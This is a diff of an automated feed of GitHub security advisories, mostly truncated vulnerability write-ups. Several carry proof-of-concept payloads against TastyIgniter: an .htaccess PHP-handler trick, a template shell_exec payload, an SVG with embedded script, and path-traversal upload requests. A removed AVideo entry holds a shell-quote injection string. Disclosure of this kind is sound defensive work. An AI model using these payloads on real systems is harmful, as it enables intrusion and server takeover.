@@ -1,12 +1,75 @@
 {
   "feed": "github-advisories",
   "source": "https://api.github.com/advisories?type=reviewed&per_page=100&sort=published&direction=desc",
-  "fetched_at": "2026-11-25T15:58:56+00:00",
+  "fetched_at": "2026-11-26T05:32:34+00:00",
   "window_days": 3,
-  "window_start": "2026-11-23",
-  "window_end": "2026-11-25",
-  "count": 18,
+  "window_start": "2026-11-24",
+  "window_end": "2026-11-26",
+  "count": 16,
   "items": [
+    {
+      "cve": "CVE-2026-69181",
+      "ghsa": "GHSA-rj59-9f77-mvg5",
+      "title": "TastyIgniter permits Path Traversal in Media Upload",
+      "description": "### Summary\nArbitrary file write outside `media/uploads/`\n\n### Details\nIt is possible to perform Path Traversal in Media Manager file upload function as admin.\n\n\n### PoC\n- login as admin\n- upload a image but in the request, change the path from `/` to `/../../`.\n\nRequest\n```http\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 302\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nAccept: application/json\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE\nOrigin: http://localhost:8888\nSec-Fetch-Si",
+      "severity": "high",
+      "published": "2026-11-25T22:54:30+00:00",
+      "link": "https://github.com/advisories/GHSA-rj59-9f77-mvg5"
+    },
+    {
+      "cve": "CVE-2026-69179",
+      "ghsa": "GHSA-7wwv-x6mc-pxqx",
+      "title": "TastyIgniter allows Remote Code Execution (RCE) via Unrestricted file upload in Media Manager",
+      "description": "### Summary\nMedia manager accepts `.htaccess` file which can be used to perform RCE.\n\n### Details\nThe file upload functionality from media manager somehow accepts `.htaccess` file. This file could be used to allow any extension to run PHP command. By doing so, it is possible to perform RCE.\n\n### PoC\n- Login as Admin\n- Create a `.htaccess` file with the following code.\n\n```\n<FilesMatch \"\\.jpg$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n```\n- Upload the `.htaccess` file via the Media Manager.\n\nRequest\n```\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 357\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0",
+      "severity": "critical",
+      "published": "2026-11-25T22:24:36+00:00",
+      "link": "https://github.com/advisories/GHSA-7wwv-x6mc-pxqx"
+    },
+    {
+      "cve": "CVE-2026-69178",
+      "ghsa": "GHSA-743w-g9pf-8p94",
+      "title": "TastyIgniter mail template editor allows remote code execution via server-side template injection",
+      "description": "### Summary\n**Where:** `POST /admin/mail_templates/edit/{id}` → body field  \n**Who can trigger:** Any admin user with `Admin.MailTemplates` permission  \n**Impact:** Arbitrary PHP execution on the server — full RCE\n\n### Details\nThe Mail templates is vulnerable to SSTI and did not perform an validation and sanitization.\n\n### PoC\n\n- login as admin\n- create new mail template with following command\n\n```\n@php echo shell_exec('echo \"RCE Executed\";id'); @endphp\n```  \n\n- save the request\n- execute the request using `X-IGNITER-REQUEST-HANDLER: onTestTemplate`\n\nRequest\n```http\nPOST /admin/mail_templates/edit/20 HTTP/1.1\nHost: localhost:8888\nContent-Length: 47\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"No",
+      "severity": "critical",
+      "published": "2026-11-25T22:24:13+00:00",
+      "link": "https://github.com/advisories/GHSA-743w-g9pf-8p94"
+    },
+    {
+      "cve": "CVE-2026-69177",
+      "ghsa": "GHSA-mqg7-fw3f-mhp7",
+      "title": "TastyIgniter allows stored XSS via file upload",
+      "description": "### Summary\nStored XSS via uploading SVG files \n\n### Details\nIt is possible to upload SVG files that contains XSS.\n\n### PoC\n\n- login as admin\n- create the following SVG file\n\n```\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"400\" height=\"400\" viewBox=\"0 0 124 124\" fill=\"none\">\n<rect width=\"124\" height=\"124\" rx=\"24\" fill=\"#000000\"/>\n   <script type=\"text/javascript\">  \n      alert(1);\n   </script>\n</svg>\n```  \n\n- upload the SVG file in media manager\n\n```\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 514\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ch",
+      "severity": "medium",
+      "published": "2026-11-25T21:52:15+00:00",
+      "link": "https://github.com/advisories/GHSA-mqg7-fw3f-mhp7"
+    },
+    {
+      "cve": "CVE-2026-68539",
+      "ghsa": "GHSA-vw2v-g4x7-xcqg",
+      "title": "fulgur allows Unbounded string-set value accumulation causes memory/CPU exhaustion (denial of service)",
+      "description": "`fulgur` converts untrusted HTML/CSS into PDF, commonly on a server that\nprocesses input supplied by many tenants. In versions from 0.4.4 up to (but not\nincluding) the patched release, the CSS `string-set` named-string values\nresolved from a document were accumulated per element with no memory budget,\nletting a small crafted document amplify into large retained memory (and the CPU\nto copy it) — a denial of service.\n\nA `string-set` value is attacker-controlled: it is resolved from an element's\nown text (`content(text)`), from one of its attributes (`attr(...)`), or from a\nCSS string literal. fulgur accumulated these values per element in two unbounded\nplaces:\n\n1. **Store (default path).** For every element that matches a `string-set` rule,\n   fulgur pushes a copy of the resolved value into a store that is retained for\n   the whole render and cloned again downstream into a per-node lookup ",
+      "severity": "high",
+      "published": "2026-11-25T19:46:45+00:00",
+      "link": "https://github.com/advisories/GHSA-vw2v-g4x7-xcqg"
+    },
+    {
+      "cve": "CVE-2026-65971",
+      "ghsa": "GHSA-7fgc-3h6c-698r",
+      "title": "livewire-powergrid: SQL injection via sortDirection in naturalSort queries",
+      "description": "## [Description]\n\nThe public Livewire property `sortDirection` is interpolated **verbatim** into a\nraw SQL `ORDER BY` clause and is not restricted to `asc`/`desc`, allowing arbitrary\nSQL injection through `POST /livewire/update`.\n\n**Data flow**\n\n- **Source** — `src/Concerns/Sorting.php`: `public string $sortDirection;` is a\n  Livewire-bound property with no whitelist/validation (it is only assigned and\n  flipped by `reverseSort()`), so it is fully attacker-controlled via the standard\n  Livewire update endpoint.\n- **Taint** — `src/DataSource/Processors/Database/Pipelines/ColumnRawQueries.php`,\n  `resolvePlaceholders()`:\n  ```php\n  preg_replace_callback('/\\{(\\w+)\\}/', fn ($m) => data_get($this->component, $m[1], ''), $sql);\n  ```\n  substitutes `{sortDirection}` with the raw property value.\n- **Sink** — `src/DataSource/Support/Sql.php::getSortSqlByDriver()` builds the\n  `naturalSort` expres",
+      "severity": "high",
+      "published": "2026-11-25T19:44:57+00:00",
+      "link": "https://github.com/advisories/GHSA-7fgc-3h6c-698r"
+    },
+    {
+      "cve": "CVE-2026-65973",
+      "ghsa": "GHSA-h746-qpxh-ph7g",
+      "title": "laradocs  Command injection via unescaped Node.js binary path in KaTeX SSR",
+      "description": "### Summary\nLocal command injection (CWE-78) in server-side KaTeX rendering via an unescaped Node.js binary path in a `proc_open()` command string.\n\n### Affected versions\n>= 0.4.0, < 1.0.0\n\n### Patched versions\n>= 1.0.0 (fixed in commit `100cb1e`)\n\n### Impact\nWhen rendering KaTeX math **server-side**, Laradocs invoked Node via `proc_open()` with a command string in which the Node binary argument was not passed through `escapeshellarg()`.\n\n`MarkdownPipelineFactory` constructs `KatexExtension` with the configured binary, which the render path resolved as:\n\n```php\n$node = $this->nodeBin ?? 'node';\n$cmd = $node . ' ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($input);\n```\n\n`$this->nodeBin` comes from `Config::nullableString('laradocs.parser.katex.node_bin')`. Both possible sources — the configured `node_bin` value, or the `'node'` default resolved from `PATH` — are operator-controlled",
+      "severity": "medium",
+      "published": "2026-11-25T19:41:53+00:00",
+      "link": "https://github.com/advisories/GHSA-h746-qpxh-ph7g"
+    },
     {
       "cve": "CVE-2026-64670",
       "ghsa": "GHSA-crj3-q72p-ggqm",
@@ -87,87 +150,6 @@
       "severity": "medium",
       "published": "2026-11-24T17:42:51+00:00",
       "link": "https://github.com/advisories/GHSA-48qj-5wxh-m8hc"
-    },
-    {
-      "cve": "CVE-2026-63304",
-      "ghsa": "GHSA-j44m-77cc-p3cc",
-      "title": "AVideo API vulnerable to OS command injection through an unescaped FFmpeg process keyword",
-      "description": "### Summary\n\nThe helper `listFFmpegProcesses($keyword)` in `plugin/API/standAlone/functions.php` builds a shell pipeline by interpolating `$keyword` inside single quotes and running it with `exec()`:\n\n```php\n$command .= \" | grep '$keyword'\";\nexec($command, $output, $status);\n```\n\nThe two callers in `plugin/API/standAlone/ffmpeg.json.php` (the `list` mode and the `isKeywordRunning` mode) pass the RAW decrypted `codeToExec` field, not the sanitized `$keyword` variable that the endpoint allowlists elsewhere. Because the value is placed inside a single-quoted shell context with no escaping, a payload that closes the quote (for example `x'; touch /tmp/marker #`) breaks out and injects an arbitrary command that runs via `exec()`'s `/bin/sh -c`. An attacker who can craft a valid encrypted payload achieves OS command execution as the web-server user.\n\n### Vulnerable code\n\nSink — `plugin/API/stan",
-      "severity": "high",
-      "published": "2026-11-23T22:06:28+00:00",
-      "link": "https://github.com/advisories/GHSA-j44m-77cc-p3cc"
-    },
-    {
-      "cve": "CVE-2026-63476",
-      "ghsa": "GHSA-9x82-4j54-863h",
-      "title": "isomorphic-git allows unbounded memory allocation from attacker-controlled delta target size (DoS)",
-      "description": "### Summary\nWhen applying a delta object from a packfile, isomorphic-git reads a **server-controlled** `targetSize` and calls `Buffer.alloc(targetSize)` with no upper bound. A single malicious HTTP response to `git.clone()`/`git.fetch()` can force a ~2 GB allocation → memory exhaustion / DoS (process killed on memory-constrained hosts).\n\n### Details\n`src/utils/applyDelta.js`:\n\n```js\nconst sourceSize = readVarIntLE(reader)\nconst targetSize = readVarIntLE(reader)   // attacker-controlled\n…\ntarget = Buffer.alloc(targetSize)\n```\n\nA pack with one `OBJ_REF_DELTA` whose header declares `targetSize = 0x7FFFFFFF` (~2 GB) and a 1-byte op causes the full allocation up front. The subsequent size-mismatch error is swallowed in `GitPackIndex.fromPack`, so on a host with spare RAM it silently wastes ~2 GB; on a small host the OS `SIGKILL`s the process.\n\n#### Canonical git behavior (divergence)\ngit reje",
-      "severity": "medium",
-      "published": "2026-11-23T21:07:02+00:00",
-      "link": "https://github.com/advisories/GHSA-9x82-4j54-863h"
-    },
-    {
-      "cve": "CVE-2026-77423",
-      "ghsa": "GHSA-2v9w-34q6-wpqx",
-      "title": "jline3 leads to ReDoS in Built-in Less Viewer Search",
-      "description": "### Summary\n\nThe JLine3 built-in `less` pager compiles user-supplied search patterns directly as\nJava regular expressions with no sanitization, timeout, or backtracking bound. A\nmalicious pattern such as `(a+)+b` can trigger catastrophic backtracking and hang the\nsession thread at 100% CPU. In deployments that expose `less` over Telnet or SSH,\nthis becomes a denial-of-service issue for the affected session and can be used to\nexhaust a bounded session pool.\n\n### Details\n\n`Less.getPattern()` in `builtins/src/main/java/org/jline/builtins/Less.java` compiles\nthe user-controlled search string directly with `Pattern.compile()`:\n\n```java\nprivate Pattern getPattern(boolean doDisplayPattern) {\n    Pattern compiled = null;\n    String _pattern = doDisplayPattern ? displayPattern : pattern;\n    if (_pattern != null) {\n        boolean insensitive =\n                ignoreCaseAlways || ignoreCaseCond &",
-      "severity": "high",
-      "published": "2026-11-23T21:02:03+00:00",
-      "link": "https://github.com/advisories/GHSA-2v9w-34q6-wpqx"
-    },
-    {
-      "cve": "CVE-2026-63410",
-      "ghsa": "GHSA-vp2j-gqfm-r3cf",
-      "title": "secp256k1-native has a compiler-induced timing side channel in scalar multiplication",
-      "description": "## Summary\n\n`Point#mul` — the default, constant-time scalar multiplication and the library's headline secret-scalar operation — could leak timing information about the secret scalar (a private key or ECDSA-style nonce in a downstream consumer) **not because of a source-level bug, but because the compiler reconstructed a branch from branchless source.**\n\nThe Montgomery ladder selects between point candidates with `uint256_select`, written deliberately branchlessly as `r = (a & ~mask) | (b & mask)` with a mask that is all-ones or all-zeros. GCC 15.2 at `-O2` recognises this select idiom, reconstructs the original boolean condition, and emits a secret-dependent conditional jump (`je`/`jne`). The branch's taken/not-taken timing correlates with the secret scalar bits flowing through the ladder.\n\nThis silently undid the 0.17.0 fix for the historical |t|=875 infinity-branch leak, which had reli",
-      "severity": "medium",
-      "published": "2026-11-23T20:59:48+00:00",
-      "link": "https://github.com/advisories/GHSA-vp2j-gqfm-r3cf"
-    },
-    {
-      "cve": "CVE-2026-58262",
-      "ghsa": "GHSA-f9h7-4mmq-vgcq",
-      "title": "Klever Go counts bitmap padding bits toward BLS quorum, allowing blocks with insufficient signatures",
-      "description": "## Summary\n\nWhen validating an incoming block header, `HeaderSigVerifier.verifyConsensusSize` counts *every* set bit in `PubKeysBitmap` — including bits that correspond to no validator (the padding bits of the final byte, which exist whenever the consensus group size is not a multiple of 8). The subsequent BLS aggregate-signature verification (`blsMultiSigner.Verify`) only checks signature validity for real validator indices and silently ignores those padding bits. As a result, a malicious or compromised block producer can set the padding bits to make the on-bits reach the PBFT quorum while only gathering a smaller number of real validator signature shares, causing a block to be accepted as correctly signed without a genuine two-thirds validator quorum.\n\n## Details\n\nQuorum counter counts padding bits — `core/process/headerCheck/headerSignatureVerify.go:145-183`:\n\n```go\nfunc (hsv *HeaderS",
-      "severity": "high",
-      "published": "2026-11-23T20:55:35+00:00",
-      "link": "https://github.com/advisories/GHSA-f9h7-4mmq-vgcq"
-    },
-    {
-      "cve": "CVE-2026-63402",
-      "ghsa": "GHSA-6jcc-5g8w-32mx",
-      "title": "i18next deepExtend recurses into inherited built-ins, allowing corruption of shared built-in objects (DoS)",
-      "description": "### Summary\n\n`deepExtend` in `src/utils.js` (reached via the public `addResourceBundle(lng, ns, data, deep, overwrite)` API) checked key existence with the `in` operator, which walks the prototype chain. A source key matching an inherited built-in (e.g. `hasOwnProperty`, `toString`, `valueOf`) therefore caused the function to recurse into the shared object on `Object.prototype`. With `overwrite: true`, a nested value could overwrite a property of that shared built-in — for example setting `Object.prototype.hasOwnProperty.call` to a non-callable value — corrupting it process-wide and causing an unrecoverable denial of service.\n\nThis is distinct from CVE-2026-48713 (i18next-fs-backend) and CVE-2026-48714 (i18next-http-middleware), which are prototype pollution via `setPath`/key-walking in different packages. This issue is in i18next core, via a different mechanism (the `in` operator in `de",
-      "severity": "medium",
-      "published": "2026-11-23T20:53:00+00:00",
-      "link": "https://github.com/advisories/GHSA-6jcc-5g8w-32mx"
-    },
-    {
-      "cve": "CVE-2026-133469",
-      "ghsa": "GHSA-2r3w-c2vx-fv5g",
-      "title": "Xen Orchestra: Empty-object login token",
-      "description": "### Summary\n\nREST cookie parsing turns `authenticationToken=j:%7B%7D` into `{}`. REST authentication passes that object to the XO token provider without requiring a string. The token collection treats `{}` as an unfiltered lookup and returns its first token; the provider authenticates as that token's owner if it is unexpired. The authenticated `/rest/v0/users/me/authentication_tokens` route then returns reusable login token IDs.\n\n\n### Details\n\n1. In `packages/xo-server/src/api/session.mjs`, function  `signIn(credentials)` has **no `params` schema** (unlike the deprecated `signInWithToken`, which declares `token: { type: 'string' }`), so `credentials.token` can be any JSON value.\n2. `packages/xo-server/src/xo-mixins/authentication.mjs`, token provider:\n   ```js\n   this.registerAuthenticationProvider(async ({ token: tokenId }, { ip } = {}) => {\n     if (!tokenId) return          // {} is t",
-      "severity": "critical",
-      "published": "2026-11-23T17:29:29+00:00",
-      "link": "https://github.com/advisories/GHSA-2r3w-c2vx-fv5g"
-    },
-    {
-      "cve": "CVE-2026-22865",
-      "ghsa": "GHSA-mqwm-5m85-gmcv",
-      "title": "Gradle causes failure to disable repositories exposing builds to malicious artifacts",
-      "description": "### Impact\n\nWhen resolving dependencies, Gradle searches repositories in declaration order. If it encounters connection errors, Gradle will disable the repository and fail dependency resolution. This is necessary for both reproducibility and security reasons to prevent dependencies from being resolved from other repositories without warning. \n\nIn previous versions of Gradle, some exceptions were not treated as fatal errors and would not cause a repository to be disabled. If a build encountered one of these exceptions, Gradle would continue to the next repository in the list and potentially resolve dependencies from a different repository. \n\n#### Vulnerability caused by continuing after max retries on transient errors\n\nAn exception like [`NoHttpResponseException`](https://hc.apache.org/httpclient-legacy/exception-handling.html#org_apache_commons_httpclient_NoHttpResponseException) can ind",
-      "severity": "high",
-      "published": "2026-11-23T15:41:57+00:00",
-      "link": "https://github.com/advisories/GHSA-mqwm-5m85-gmcv"
-    },
-    {
-      "cve": "CVE-2026-22816",
-      "ghsa": "GHSA-w78c-w6vf-rw82",
-      "title": "Gradle causes Failure to disable repositories can expose builds to malicious artifacts",
-      "description": "### Impact\n\nWhen resolving dependencies, Gradle searches repositories in declaration order. If it encounters connection errors, Gradle will disable the repository and fail dependency resolution. This is necessary for both reproducibility and security reasons to prevent dependencies from being resolved from other repositories without warning. \n\nIn previous versions of Gradle, some exceptions were not treated as fatal errors and would not cause a repository to be disabled. If a build encountered one of these exceptions, Gradle would continue to the next repository in the list and potentially resolve dependencies from a different repository. \n\n#### Vulnerability caused by unresolvable host names\n\n[`UnknownHostException`](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/net/UnknownHostException.html) are caused when a host name cannot be resolved to an IP address. This can b",
-      "severity": "high",
-      "published": "2026-11-23T15:33:34+00:00",
-      "link": "https://github.com/advisories/GHSA-w78c-w6vf-rw82"
     }
   ]
 }
